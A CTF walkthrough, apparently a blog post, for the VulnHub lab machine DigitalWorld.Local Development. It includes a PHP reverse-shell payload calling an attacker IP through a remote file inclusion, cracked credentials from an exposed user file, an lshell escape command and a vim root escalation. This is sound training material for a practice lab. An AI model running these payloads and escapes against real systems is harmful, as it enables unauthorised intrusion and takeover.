---
title: VulnHub DigitalWorld.Local - Development Walkthrough
date: 2023-05-22 23:45:00 +0530
img_path: /assets/img/vulnhub-dev-walkthrough
categories: [OSCP, walkthroughs, vulnhub, pentesting]
tags: [oscp, walkthroughs, vulnhub walkthroughs, development, vulnhub, pentesting, hacking]     # TAG names should always be lowercase
---

# DIGITALWORLD.LOCAL: DEVELOPMENT Walkthrough


Machine IP:
192.168.174.132

Domain:
dev.vh


```
This machine reminds us of a DEVELOPMENT environment: misconfigurations rule the roost. This is designed for OSCP practice, and the original version of the machine was used for a CTF. It is now revived, and made slightly more nefarious than the original.

If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): Development is (#1): different from production, (#2): a mess of code, (#3): under construction.

Note: Some users report the box may seem to be "unstable" with aggressive scanning. The homepage gives a clue why.

Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.
```

## nmap
![nmap scan](Pasted%20image%2020230522225153.png)

## Enumeration
Can't use gobuster because there is appranetly a "Host intrusion detection system" that is just terminating the connection whenever rapid requests are made by gobuster.

Source code revealed `/development` page

http://dev.vh:8080/development
```
Under development we have a variety of projects.

/test.pcap: a simple bash script that allows Director, from the comfort of his desk, to be routinely fed network information. He can then employ a scraper to download the .pcap files to view at his own convenience.
/development.html: the landing page to our development secret page. Only insiders will know!
/registration: under construction.

We are also testing a very simple web-based log-in form, a HIDS called OSSEC (heard it is awesome) and some other developments.

The question is, do you know what to do? Try harder!
```

Downloaded `test.pcap` from http://dev.vh:8080/test.pcap

Found a "secret" page from the test.pcap
`/developmentsecretpage`
![Test.pacp](Pasted%20image%2020230522232451.png)

http://dev.vh:8080/developmentsecretpage/directortestpagev1.php

Found another page:
http://dev.vh:8080/developmentsecretpage/sitemap.php

Found a login page
![Login page](Pasted%20image%2020230522232935.png)

When tried to login with dummy creds:
![](Pasted%20image%2020230522232955.png)



Googling `slogin_lib.inc.php` shows a vulnerability in `Simple Text-File Login script (SiTeFiLo) 1.0.6 - File Disclosure / Remote File Inclusion`
https://www.exploit-db.com/exploits/7444

```txt
EXPLOIT: /[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]
```

SiTeFiLo - the login is done from a simple text file. 

Vulnerable code:
```txt
[CODE] include_once ($slogin_path . "header.inc.php"); [/CODE]
```
Since the slogin_path variable is directly appended to the header.inc.php - we can create header.inc.php with a reverse shell code, host it on our server and make a request by putting slogin_path as our host.

header.inc.php
```
$sock=fsockopen("192.168.174.131",1560);system("sh <&3 >&3 2>&3");
```

http://dev.vh:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=http://192.168.174.131:8000/

Didn't work. We are not even getting a request to the python HTTP server for the file.

But there is another bug of Sensitive Data disclosure for the same SiTeFiLo. We can see the text file that contains the creds

```txt
[!] EXPLOIT: /[path]/slog_users.txt
```

http://dev.vh:8080/developmentsecretpage/slog_users.txt

```
admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81
patrick, 87e6d56ce79af90dbe07d387d3d0579e
qiu, ee64497098d0926d198f54f6d5431f98
```
Hashes cracked with hashes.com
![hashes.com](Pasted%20image%2020230523000101.png)


```
patrick:P@ssw0rd25
intern:12345678900987654321
qui:qiu
```
admin password could not be cracked.

SSH login worked for intern creds.

Shell is restricted.
![Restricted shell](Pasted%20image%2020230523000838.png)


Allowed commands:
![](Pasted%20image%2020230523000955.png)


This is a limited shell.
https://0xffsec.com/handbook/shells/restricted-shells/


![](Pasted%20image%2020230523001943.png)


The shell is `lsshell` https://github.com/ghantoos/lshell

The shell can be bypassed: https://www.aldeid.com/wiki/Lshell

![](Pasted%20image%2020230523002049.png)


Now we have a proper shell.
```
echo os.system('/bin/bash')
```


We can switch to patrick as we already have the password from before.
```
su patrick
```

![](Pasted%20image%2020230523003253.png)


vim and nano dont require password.

GTFO bins for vim: https://gtfobins.github.io/gtfobins/vim/

Spawn a new bash shell with vim
![](Pasted%20image%2020230523003344.png)


Ta-da! We root!